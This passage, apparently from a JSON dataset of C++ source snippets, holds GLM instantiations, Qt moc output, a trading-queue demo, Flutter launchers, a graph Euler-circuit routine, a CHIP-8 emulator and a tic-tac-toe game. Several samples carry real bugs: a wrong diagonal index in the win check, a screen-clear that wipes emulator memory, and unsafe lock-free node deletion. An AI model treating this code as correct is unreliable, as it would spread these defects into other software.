vec<1, int64, highp>;\ntemplate struct vec<1, float32, highp>;\ntemplate struct vec<1, float64, highp>;\n\n// tvec2 type explicit instantiation\ntemplate struct vec<2, uint8, lowp>;\ntemplate struct vec<2, uint16, lowp>;\ntemplate struct vec<2, uint32, lowp>;\ntemplate struct vec<2, uint64, lowp>;\ntemplate struct vec<2, int8, lowp>;\ntemplate struct vec<2, int16, lowp>;\ntemplate struct vec<2, int32, lowp>;\ntemplate struct vec<2, int64, lowp>;\ntemplate struct vec<2, float32, lowp>;\ntemplate struct vec<2, float64, lowp>;\n\ntemplate struct vec<2, uint8, mediump>;\ntemplate struct vec<2, uint16, mediump>;\ntemplate struct vec<2, uint32, mediump>;\ntemplate struct vec<2, uint64, mediump>;\ntemplate struct vec<2, int8, mediump>;\ntemplate struct vec<2, int16, mediump>;\ntemplate struct vec<2, int32, mediump>;\ntemplate struct vec<2, int64, mediump>;\ntemplate struct vec<2, float32, mediump>;\ntemplate struct vec<2, float64, mediump>;\n\ntemplate struct vec<2, uint8, highp>;\ntemplate struct vec<2, uint16, highp>;\ntemplate struct vec<2, uint32, highp>;\ntemplate struct vec<2, uint64, highp>;\ntemplate struct vec<2, int8, highp>;\ntemplate struct vec<2, int16, highp>;\ntemplate struct vec<2, int32, highp>;\ntemplate struct vec<2, int64, highp>;\ntemplate struct vec<2, float32, highp>;\ntemplate struct vec<2, float64, highp>;\n\n// tvec3 type explicit instantiation\ntemplate struct vec<3, uint8, lowp>;\ntemplate struct vec<3, uint16, lowp>;\ntemplate struct vec<3, uint32, lowp>;\ntemplate struct vec<3, uint64, lowp>;\ntemplate struct vec<3, int8, lowp>;\ntemplate struct vec<3, int16, lowp>;\ntemplate struct vec<3, int32, lowp>;\ntemplate struct vec<3, int64, lowp>;\ntemplate struct vec<3, float32, lowp>;\ntemplate struct vec<3, float64, lowp>;\n\ntemplate struct vec<3, uint8, mediump>;\ntemplate struct vec<3, uint16, mediump>;\ntemplate struct vec<3, uint32, mediump>;\ntemplate struct vec<3, uint64, mediump>;\ntemplate struct vec<3, int8, mediump>;\ntemplate struct vec<3, int16, mediump>;\ntemplate struct vec<3, int32, mediump>;\ntemplate struct vec<3, int64, mediump>;\ntemplate struct vec<3, float32, mediump>;\ntemplate struct vec<3, float64, mediump>;\n\ntemplate struct vec<3, uint8, highp>;\ntemplate struct vec<3, uint16, highp>;\ntemplate struct vec<3, uint32, highp>;\ntemplate struct vec<3, uint64, highp>;\ntemplate struct vec<3, int8, highp>;\ntemplate struct vec<3, int16, highp>;\ntemplate struct vec<3, int32, highp>;\ntemplate struct vec<3, int64, highp>;\ntemplate struct vec<3, float32, highp>;\ntemplate struct vec<3, float64, highp>;\n\n// tvec4 type explicit instantiation\ntemplate struct vec<4, uint8, lowp>;\ntemplate struct vec<4, uint16, lowp>;\ntemplate struct vec<4, uint32, lowp>;\ntemplate struct vec<4, uint64, lowp>;\ntemplate struct vec<4, int8, lowp>;\ntemplate struct vec<4, int16, lowp>;\ntemplate struct vec<4, int32, lowp>;\ntemplate struct vec<4, int64, lowp>;\ntemplate struct vec<4, float32, lowp>;\ntemplate struct vec<4, float64, lowp>;\n\ntemplate struct vec<4, uint8, mediump>;\ntemplate struct vec<4, uint16, mediump>;\ntemplate struct vec<4, uint32, mediump>;\ntemplate struct vec<4, uint64, mediump>;\ntemplate struct vec<4, int8, mediump>;\ntemplate struct vec<4, int16, mediump>;\ntemplate struct vec<4, int32, mediump>;\ntemplate struct vec<4, int64, mediump>;\ntemplate struct vec<4, float32, mediump>;\ntemplate struct vec<4, float64, mediump>;\n\ntemplate struct vec<4, uint8, highp>;\ntemplate struct vec<4, uint16, highp>;\ntemplate struct vec<4, uint32, highp>;\ntemplate struct vec<4, uint64, highp>;\ntemplate struct vec<4, int8, highp>;\ntemplate struct vec<4, int16, hig",
    "/****************************************************************************\n** Meta object code from reading C++ file 'mainwindow.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.7.1)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include \"../../../mainwindow.h\"\n#include <QtCore/qmetatype.h>\n\n#include <QtCore/qtmochelpers.h>\n\n#include <memory>\n\n\n#include <QtCore/qxptype_traits.h>\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'mainwindow.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.7.1. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\n#ifndef Q_CONSTINIT\n#define Q_CONSTINIT\n#endif\n\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nQT_WARNING_DISABLE_GCC(\"-Wuseless-cast\")\nnamespace {\n\n#ifdef QT_MOC_HAS_STRINGDATA\nstruct qt_meta_stringdata_CLASSMainWindowENDCLASS_t {};\nconstexpr auto qt_meta_stringdata_CLASSMainWindowENDCLASS = QtMocHelpers::stringData(\n    \"MainWindow\",\n    \"on_plus_clicked\",\n    \"\",\n    \"on_minus_clicked\",\n    \"on_option_button_clicked\",\n    \"on_darkTheme_button_clicked\",\n    \"on_comboBoxTemp_currentIndexChanged\",\n    \"index\",\n    \"on_comboBoxPressure_currentIndexChanged\",\n    \"updateTemperatureDisplay\",\n    \"updatePressureDisplay\",\n    \"applyDarkTheme\",\n    \"applyLightTheme\",\n    \"on_plusDirection_clicked\",\n    \"on_minusDirection_clicked\",\n    \"on_conderButton1_clicked\",\n    \"on_conderButton2_clicked\",\n    \"on_conderButton3_clicked\"\n);\n#else  // !QT_MOC_HAS_STRINGDATA\n#error \"qtmochelpers.h not found or too old.\"\n#endif // !QT_MOC_HAS_STRINGDATA\n} // unnamed namespace\n\nQ_CONSTINIT static const uint qt_meta_data_CLASSMainWindowENDCLASS[] = {\n\n // content:\n      12,       // revision\n       0,       // classname\n       0,    0, // classinfo\n      15,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       0,       // signalCount\n\n // slots: name, argc, parameters, tag, flags, initial metatype offsets\n       1,    0,  104,    2, 0x08,    1 /* Private */,\n       3,    0,  105,    2, 0x08,    2 /* Private */,\n       4,    0,  106,    2, 0x08,    3 /* Private */,\n       5,    0,  107,    2, 0x08,    4 /* Private */,\n       6,    1,  108,    2, 0x08,    5 /* Private */,\n       8,    1,  111,    2, 0x08,    7 /* Private */,\n       9,    0,  114,    2, 0x08,    9 /* Private */,\n      10,    0,  115,    2, 0x08,   10 /* Private */,\n      11,    0,  116,    2, 0x08,   11 /* Private */,\n      12,    0,  117,    2, 0x08,   12 /* Private */,\n      13,    0,  118,    2, 0x08,   13 /* Private */,\n      14,    0,  119,    2, 0x08,   14 /* Private */,\n      15,    0,  120,    2, 0x08,   15 /* Private */,\n      16,    0,  121,    2, 0x08,   16 /* Private */,\n      17,    0,  122,    2, 0x08,   17 /* Private */,\n\n // slots: parameters\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void, QMetaType::Int,    7,\n    QMetaType::Void, QMetaType::Int,    7,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n\n       0        // eod\n};\n\nQ_CONSTINIT const QMetaObject MainWindow::staticMetaObject = { {\n    QMetaObject::SuperData::link<QMainWindow::staticMetaObject>(),\n    qt_meta_stringdata_CLASSMainWindowENDCLASS.offsetsAndSizes,\n    qt_meta_data_CLASSMainWindowENDCLASS,\n    qt_static_metacall,\n    nullptr,\n    qt_incomplete_metaTypeArray<qt_meta_stringdata_CLASSMainWindowENDCLASS_t,\n        // Q_OBJECT / Q_GADGET\n        QtPrivate::TypeAndForceComplete<MainWindow, std::true_type>,\n        // method 'on_plus_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'on_minus_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'on_option_button_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'on_darkTheme_button_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'on_comboBoxTemp_currentIndexChanged'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        QtPrivate::TypeAndForceComplete<int, std::false_type>,\n        // method 'on_comboBoxPressure_currentIndexChanged'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        QtPrivate::TypeAndForceComplete<int, std::false_type>,\n        // method 'updateTemperatureDisplay'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'updatePressureDisplay'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'applyDarkTheme'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method ",
    "using namespace std;\n#include <bits/stdc++.h>\n\n// Lock-free queue for order processing\ntemplate<typename T>\nclass LockFreeQueue {\nprivate:\n    struct Node {\n        shared_ptr<T> data;\n        atomic<Node*> next;\n        Node() : next(nullptr) {}\n    };\n\n    atomic<Node*> head;\n    atomic<Node*> tail;\n\npublic:\n    LockFreeQueue() {\n        Node* dummy = new Node();\n        head.store(dummy);\n        tail.store(dummy);\n    }\n\n    void push(T item) {\n        Node* new_node = new Node();\n        new_node->data = make_shared<T>(move(item));\n\n        while (true) {\n            Node* last = tail.load();\n            Node* next = last->next.load();\n\n            if (last == tail.load()) {\n                if (next == nullptr) {\n                    if (last->next.compare_exchange_weak(next, new_node)) {\n                        tail.compare_exchange_weak(last, new_node);\n                        return;\n                    }\n                } else {\n                    tail.compare_exchange_weak(last, next);\n                }\n            }\n        }\n    }\n\n    bool pop(T& result) {\n        while (true) {\n            Node* first = head.load();\n            Node* last = tail.load();\n            Node* next = first->next.load();\n\n            if (first == head.load()) {\n                if (first == last) {\n                    if (next == nullptr) {\n                        return false;\n                    }\n                    tail.compare_exchange_weak(last, next);\n                } else {\n                    if (next) {\n                        result = move(*next->data);\n                        if (head.compare_exchange_weak(first, next)) {\n                            delete first;\n                            return true;\n                        }\n                    }\n                }\n            }\n        }\n    }\n};\n\n// Order structure\nstruct Order {\n    int id;\n    double price;\n    int quantity;\n};\n\n// Order book using a sorted vector for quick binary search\nclass OrderBook {\nprivate:\n    vector<Order> buy_orders;\n    vector<Order> sell_orders;\n\npublic:\n    void addOrder(const Order& order) {\n        auto& orders = (order.quantity > 0) ? buy_orders : sell_orders;\n        auto it = lower_bound(orders.begin(), orders.end(), order,\n            [](const Order& a, const Order& b) { return a.price > b.price; });\n        orders.insert(it, order);\n    }\n\n    bool matchOrders() {\n        if (buy_orders.empty() || sell_orders.empty()) return false;\n\n        if (buy_orders.front().price >= sell_orders.front().price) {\n            // Match found, process the trade\n            cout << \"Trade executed: \" << buy_orders.front().id << \" - \" << sell_orders.front().id << endl;\n            buy_orders.erase(buy_orders.begin());\n            sell_orders.erase(sell_orders.begin());\n            return true;\n        }\n\n        return false;\n    }\n};\n\n// Main trading system\nclass TradingSystem {\nprivate:\n    LockFreeQueue<Order> order_queue;\n    OrderBook order_book;\n    atomic<bool> running{true};\n\n    void processOrders() {\n        while (running) {\n            Order order;\n            if (order_queue.pop(order)) {\n                order_book.addOrder(order);\n                while (order_book.matchOrders()) {}\n            }\n        }\n    }\n\npublic:\n    void submitOrder(const Order& order) {\n        order_queue.push(order);\n    }\n\n    void run() {\n        thread processor(&TradingSystem::processOrders, this);\n        processor.join();\n    }\n\n    void stop() {\n        running = false;\n    }\n};\n\nint main() {\n    TradingSystem trading_system;\n\n    // Simulate order submission\n    thread order_generator([&]() {\n        for (int i = 0; i < 1000; ++i) {\n            Order order{i, 100.0 + (rand() % 10), (rand() % 2 == 0) ? 100 : -100};\n            trading_system.submitOrder(order);\n            this_thread::sleep_for(chrono::milliseconds(1));\n        }\n        trading_system.stop();\n    });\n\n    trading_system.run();\n    order_generator.join();\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"carousel_test\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"arrayListType.h\"  // Include the arrayListType header\n#include \"circle.h\"         // Include Shape subclasses\n#include \"triangle.h\"\n#include \"rectangle.h\"\n\nint main() {\n    // Create an arrayListType of shapes\n    arrayListType<Shape*> shapeList(10);  // Assuming size 10\n\n    // Create various shapes\n    Circle* c1 = new Circle(5.0);         // Circle with radius 5.0\n    Rectangle* r1 = new Rectangle(4.0, 6.0);  // Rectangle with width 4.0 and height 6.0\n    Triangle* t1 = new Triangle(3.0, 4.0); // Triangle with sides 3.0, 4.0\n\n    // Add shapes to the arrayListType\n    shapeList.insert(c1);\n    shapeList.insert(r1);\n    shapeList.insert(t1);\n\n    // Display the shapes in the list\n    for (int i = 0; i < shapeList.listSize(); i++) {\n        cout << shapeList[i]->describe() << endl;  // Assuming print is a method for Shape objects\n    }\n\n    // Test other operations: remove a shape, search for a shape, etc.\n    shapeList.remove(c1);  // Remove the second shape (r1)\n\n    // Display the shapes in the list\n    cout << \"After removing circle\\n\";\n    for (int i = 0; i < shapeList.listSize(); i++) {\n        cout << shapeList[i]->describe() << endl;  // Assuming print is a method for Shape objects\n    }\n\n    // Clean up memory\n    delete c1;\n    delete r1;\n    delete t1;\n\n    return 0;\n}\n",
    "#include \"Graph.hpp\"\n\n\nGraph::Graph(int V, int E) : V(V), E(E) {\n    vec_list.resize(V);\n    in_degree.resize(V, 0);\n    out_degree.resize(V, 0);\n}\n\nvoid Graph::addEdge(int u, int v) {\n    vec_list[u - 1].push_back(v - 1);\n    out_degree[u - 1]++;\n    in_degree[v - 1]++;\n    cout << \"added edge from \" << u << \" to \" << v << endl;\n}\n\nvoid Graph::removeEdge(int u, int v) {\n    u = u - 1;\n    v = v - 1;\n    vec_list[u].remove(v);\n    out_degree[u]--;\n    in_degree[v]--;\n    cout << \"removed edge from \" << u + 1 << \" to \" << v + 1 << endl;\n}\n\nvoid Graph::printGraph() {\n    for (int i = 0; i < V; i++) {\n        cout << i + 1 << \" -> \";\n        for (auto it : vec_list[i]) {\n            cout << it + 1 << \" \";\n        }\n        cout << endl;\n    }\n}\n\nbool Graph::isConnected() {\n    vector<bool> visited(V, false);\n    queue<int> q;\n\n    // Find a vertex with a non-zero degree\n    int start = -1;\n    for (int i = 0; i < V; ++i) {\n        if (!vec_list[i].empty()) {\n            start = i;\n            break;\n        }\n    }\n\n    // If no edges in the graph, it's trivially connected\n    if (start == -1) {\n        return true;\n    }\n\n    // BFS to check connectivity\n    q.push(start);\n    visited[start] = true;\n    while (!q.empty()) {\n        int u = q.front();\n        q.pop();\n        for (int v : vec_list[u]) {\n            if (!visited[v]) {\n                visited[v] = true;\n                q.push(v);\n            }\n        }\n    }\n\n    // Check if all vertices with non-zero degree are visited\n    for (int i = 0; i < V; ++i) {\n        if (!vec_list[i].empty() && !visited[i]) {\n            return false;\n        }\n    }\n\n    return true;\n}\n\nbool Graph::isEulerianCircuit() {\n    // Check if the graph is connected\n    if (!isConnected()) {\n        return false;\n    }\n    // Check the in-degree and out-degree conditions\n    for (int i = 0; i < V; ++i) {\n        if (in_degree[i] != out_degree[i]) {\n            return false;\n        }\n    }\n    return true;\n}\n\n\n/**\n * Find if there is an Euler Circuit in the graph, if so, return true and print the path\n * @param g Graph object\n * @param V Number of vertices\n * @param E Number of edges\n * @return true if there is an Euler Circuit, false otherwise\n */\nvector<int> find_Euler_Circuit(Graph &g, int V, int E) {\n    vector<int> euler_circuit;\n\n    if (!g.isEulerianCircuit()) {\n        cout << \"There is no Euler circuit in the graph\" << endl;\n        return euler_circuit;\n    }\n\n    cout << \"There is an Euler circuit in the graph\" << endl;\n\n    // Find a starting vertex\n    int start = 0;\n    for (int i = 0; i < V; ++i) {\n        if (!g.vec_list[i].empty()) {\n            start = i;\n            break;\n        }\n    }\n\n    // Use stack to store the current path in Eulerian circuit\n    stack<int> current_path;\n    current_path.push(start);\n\n    while (!current_path.empty()) {\n        int u = current_path.top();\n        if (!g.vec_list[u].empty()) {\n            int v = g.vec_list[u].back();\n            g.removeEdge(u + 1, v + 1);\n            current_path.push(v);\n        } else {\n            euler_circuit.push_back(u);\n            current_path.pop();\n        }\n    }\n\n    return euler_circuit;\n}\n\nvoid print_Euler_Circuit(const vector<int>& euler_circuit) {\n    if (euler_circuit.empty()) {\n        return;\n    }\n\n    cout << \"The Euler circuit is: \";\n    for (auto it = euler_circuit.rbegin(); it != euler_circuit.rend(); ++it) {\n        cout << *it + 1 << \" \";\n    }\n    cout << endl;\n}\n",
    "#include <cstdint>\n#include <iostream>\n#include <fstream>\n#include <chrono>\n#include <random>\n#include <stdlib.h>\n#include <memory.h>\n#include <sys/stat.h>\n\nconst unsigned int FONTSET_SIZE = 80;\nconst unsigned int FONTSET_START_ADDRESS = 0x50;\nconst unsigned int START_ADDRESS = 0x200;\n\nuint8_t fontset[FONTSET_SIZE]={\n\n\t0xF0, 0x90, 0x90, 0x90, 0xF0, // 0\n\t0x20, 0x60, 0x20, 0x20, 0x70, // 1\n\t0xF0, 0x10, 0xF0, 0x80, 0xF0, // 2\n\t0xF0, 0x10, 0xF0, 0x10, 0xF0, // 3\n\t0x90, 0x90, 0xF0, 0x10, 0x10, // 4\n\t0xF0, 0x80, 0xF0, 0x10, 0xF0, // 5\n\t0xF0, 0x80, 0xF0, 0x90, 0xF0, // 6\n\t0xF0, 0x10, 0x20, 0x40, 0x40, // 7\n\t0xF0, 0x90, 0xF0, 0x90, 0xF0, // 8\n\t0xF0, 0x90, 0xF0, 0x10, 0xF0, // 9\n\t0xF0, 0x90, 0xF0, 0x90, 0x90, // A\n\t0xE0, 0x90, 0xE0, 0x90, 0xE0, // B\n\t0xF0, 0x80, 0x80, 0x80, 0xF0, // C\n\t0xE0, 0x90, 0x90, 0x90, 0xE0, // D\n\t0xF0, 0x80, 0xF0, 0x80, 0xF0, // E\n\t0xF0, 0x80, 0xF0, 0x80, 0x80  // F\n\n};\n\n\nclass chip8{\n\n    public:\n        uint8_t registers[16]{};            //General purpose 8bit registers V0 - VF\n        uint8_t memory[4096]{};             //4k bits of memory\n        uint16_t xregister{};               //16-bit index register\n        uint16_t programCounter{};          //16-bit program counter\n        uint16_t stack[16]{};               //16-bit, 16 level program stack\n        uint8_t stackPointer{};             //8-bit stack pointer\n        uint8_t delayTimer{};               //8-bit delay timer\n        uint8_t soundTimer{};               //8-bit sound timer\n        uint8_t keypad[16]{};               //input keys\n        uint32_t video[64*32]{};           //monochrome screen\n        uint16_t opcode;\n\n\t\ttypedef void (chip8::*Chip8Func)();\n\n    \tChip8Func table[0xF + 1];\n    \tChip8Func table0[0xE + 1];\n    \tChip8Func table8[0xE + 1];\n    \tChip8Func tableE[0xE + 1];\n    \tChip8Func tableF[0x65 + 1];\n\n\n        chip8(): randGen(std::chrono::system_clock::now().time_since_epoch().count()){\n\n\n            programCounter = START_ADDRESS;\n\n            for (unsigned int i = 0; i < FONTSET_SIZE; i++){\n                memory[FONTSET_START_ADDRESS + i] = fontset[i];\n            }\n\n            randByte = std::uniform_int_distribution<uint8_t>(0, 255U);\n\t\t\t\t\t// Set up function pointer table\n\t\t\ttable[0x0] = &Table0;\n\t\t\ttable[0x1] = &OP_1nnn;\n\t\t\ttable[0x2] = &OP_2nnn;\n\t\t\ttable[0x3] = &OP_3xkk;\n\t\t\ttable[0x4] = &OP_4xkk;\n\t\t\ttable[0x5] = &OP_5xy0;\n\t\t\ttable[0x6] = &OP_6xkk;\n\t\t\ttable[0x7] = &OP_7xkk;\n\t\t\ttable[0x8] = &Table8;\n\t\t\ttable[0x9] = &OP_9xy0;\n\t\t\ttable[0xA] = &OP_Annn;\n\t\t\ttable[0xB] = &OP_Bnnn;\n\t\t\ttable[0xC] = &OP_Cxkk;\n\t\t\ttable[0xD] = &OP_Dxyn;\n\t\t\ttable[0xE] = &TableE;\n\t\t\ttable[0xF] = &TableF;\n\n\t\t\tfor (size_t i = 0; i <= 0xE; i++)\n\t\t\t{\n\t\t\t\ttable0[i] = &OP_NULL;\n\t\t\t\ttable8[i] = &OP_NULL;\n\t\t\t\ttableE[i] = &OP_NULL;\n\t\t\t}\n\n\t\t\ttable0[0x0] = &OP_00E0;\n\t\t\ttable0[0xE] = &OP_00EE;\n\n\t\t\ttable8[0x0] = &OP_8xy0;\n\t\t\ttable8[0x1] = &OP_8xy1;\n\t\t\ttable8[0x2] = &OP_8xy2;\n\t\t\ttable8[0x3] = &OP_8xy3;\n\t\t\ttable8[0x4] = &OP_8xy4;\n\t\t\ttable8[0x5] = &OP_8xy5;\n\t\t\ttable8[0x6] = &OP_8xy6;\n\t\t\ttable8[0x7] = &OP_8xy7;\n\t\t\ttable8[0xE] = &OP_8xyE;\n\n\t\t\ttableE[0x1] = &OP_ExA1;\n\t\t\ttableE[0xE] = &OP_Ex9E;\n\n\t\t\tfor (size_t i = 0; i <= 0x65; i++)\n\t\t\t{\n\t\t\t\ttableF[i] = &OP_NULL;\n\t\t\t}\n\n\t\t\ttableF[0x07] = &OP_Fx07;\n\t\t\ttableF[0x0A] = &OP_Fx0A;\n\t\t\ttableF[0x15] = &OP_Fx15;\n\t\t\ttableF[0x18] = &OP_Fx18;\n\t\t\ttableF[0x1E] = &OP_Fx1E;\n\t\t\ttableF[0x29] = &OP_Fx29;\n\t\t\ttableF[0x33] = &OP_Fx33;\n\t\t\ttableF[0x55] = &OP_Fx55;\n\t\t\ttableF[0x65] = &OP_Fx65;\n\t\t}\n\n\t\tvoid Table0(){\n\t\t\t((*this).*(table0[opcode & 0x000Fu]))();\n\t\t}\n\n\t\tvoid Table8(){\n\t\t\t((*this).*(table8[opcode & 0x000Fu]))();\n\t\t}\n\n\t\tvoid TableE(){\n\t\t\t((*this).*(tableE[opcode & 0x000Fu]))();\n\t\t}\n\n\t\tvoid TableF(){\n\t\t\t((*this).*(tableF[opcode & 0x00FFu]))();\n\t\t}\n\n\t\tvoid OP_NULL(){}\n\n\t\tvoid cycle(){\n\n\n\t\t\topcode = (memory[programCounter] << 8u) | memory[programCounter+1];\n\n\t\t\tprogramCounter += 2;\n\n\t\t\t((*this).*(table[(opcode & 0xF000u) >> 12u]))();\n\n\t\t\tif(delayTimer > 0){\n\t\t\t\tdelayTimer--;\n\t\t\t}\n\t\t\t\n\t\t\tif(soundTimer > 0){\n\t\t\t\tsoundTimer--;\n\t\t\t}\n\n\t\t}\n\n\n        void loadRom(const char* filename){\n            \n            struct stat results;\n            stat(filename,&results);    //get the number of bytes to read\n\t\t\tstd::cout <<\"The size of the file in bytes is -> \" << results.st_size << std::endl;\n\n            char* buffer = new char[results.st_size];\n\n\t\t\tstd::cout << \"Opening rom file\" << std::endl;\t\n            std::ifstream rom(filename, std::ios::in | std::ios::binary);\n\n\t\t\tif(rom.is_open()){\n\t\t\t\trom.read(buffer,results.st_size);\n\t\t\t}else{\n\t\t\t\tstd::cout << \"ERROR READING ROM\" << std::endl;\n\t\t\t}\n\t\t\tstd::cout << \"Copying file to memory\" << std::endl;\n\n            for(long i = 0; i < results.st_size; i++){\n\t\t\t\tmemory[START_ADDRESS+i] = buffer[i];\n            }\n\t\t\tstd::cout<<\"Done copying to memory\" << std::endl;\n\n\t\t\tdelete[] buffer;\n\n\t\t\trom.close();\n\n        }\n\n        void OP_00E0(){ //Clear the display.\n\n            memset(memory,0,sizeof(video));\n        }\n\n        void OP_00EE(){ //The interpreter sets the program counter to the ad",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"task_manager\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\r\n#include<bits/stdc++.h>\r\nusing namespace std;\r\nvoid placeOnBoard(char player,vector<char>&gameboard){\r\n    int cNumber;\r\n    while(true){\r\n        cout<<player<<\"  Choose a number from 1 to 9: \";\r\n        cin>>cNumber;\r\n        if(cNumber>=1&&cNumber<=9&&gameboard[cNumber-1]!='X'&&gameboard[cNumber-1]!='O'){\r\n            break;\r\n        }\r\n        cout<<\"Invalid input or spot already marked. Choose another number.\"<<endl;\r\n    }\r\n    gameboard[cNumber-1]=player;\r\n    cout<<\"-------------\"<<endl;\r\n    for(int i=0;i<9;i+=3){\r\n        cout<<\"| \"<<gameboard[i]<<\" | \"<<gameboard[i+1]<<\" | \"<<gameboard[i+2]<<\" | \"<<endl;\r\n        cout<<\"-------------\"<<endl;\r\n    }\r\n}\r\nbool checkWin(const vector<char>&gameboard,char m){\r\n    for(int i=0;i<9;i+=3){\r\n        if(gameboard[i]==m&&gameboard[i+1]==m&&gameboard[i+2]==m){\r\n            return true;\r\n        }\r\n    }\r\n    for(int i=0;i<3;i++){\r\n        if(gameboard[i]==m&&gameboard[i+3]==m&&gameboard[i+6]==m){\r\n            return true;\r\n        }\r\n    }\r\n    if((gameboard[0]==m&&gameboard[4]==m&&gameboard[6]==m)||(gameboard[2]==m&&gameboard[4]==m&&gameboard[6]==m)){\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\nbool checkDraw(const vector<char>&gameboard){\r\n    for(char m:gameboard){\r\n        if(m!='X'&&m!='O'){\r\n            return false;\r\n        }\r\n    }\r\n    cout<<\"We have a draw!! Thank you for playing.\"<<endl;\r\n    return true;\r\n}\r\nint main(){\r\n    cout<<\"* Tic-Tac-Toe Game *\"<<endl;\r\n    while(true){\r\n        vector<string>players;\r\n        string player1;\r\n        cout<<\"Name of player 1: \";\r\n        cin>>player1;\r\n        players.push_back(player1);\r\n        string player2;\r\n        cout<<\"Name of player 2: \";\r\n        cin>>player2;\r\n        players.push_back(player2);\r\n        vector<char>m={'X','O'};\r\n        vector<char>gameboard(9,' ');\r\n        cout<<\"These are the players: \"<<players[0]<<\" and \"<<players[1]<<endl;\r\n        cout<<\"These are their markers: \"<<m[0]<<\" and \"<<m[1]<<endl;\r\n        cout<<\"The game board looks like this:\"<<endl;\r\n        cout<<\"-------------\"<<endl;\r\n        for(int i=0;i<9;i+=3){\r\n            cout<<\"| \"<<i+1<<\" | \"<<i+2<<\" | \"<<i+3<<\" | \"<<endl;\r\n            cout<<\"-------------\"<<endl;\r\n        }\r\n        while(true){\r\n            placeOnBoard(m[0],gameboard);\r\n            if(checkWin(gameboard,m[0])){\r\n                cout<<\"We have a winner!! Congratulations \"<<players[0]<<\"!!\"<<endl;\r\n                break;\r\n            }\r\n            if(checkDraw(gameboard)){\r\n                break;\r\n            }\r\n            placeOnBoard(m[1],gameboard);\r\n            if(checkWin(gameboard,m[1])){\r\n                cout<<\"We have a winner!! Congratulations \"<<players[1]<<\"!!\"<<endl;\r\n                break;\r\n            }\r\n            if(checkDraw(gameboard)){\r\n                break;\r\n            }\r\n        }\r\n        char playagain;\r\n        cout<<\"Do you want to  play another game? (y/n): \";\r\n        cin>>playagain;\r\n        if(playagain!='y'&&playagain!='Y'){\r\n            break;\r\n        }\r\n    }\r\n    return 0;\r\n}",
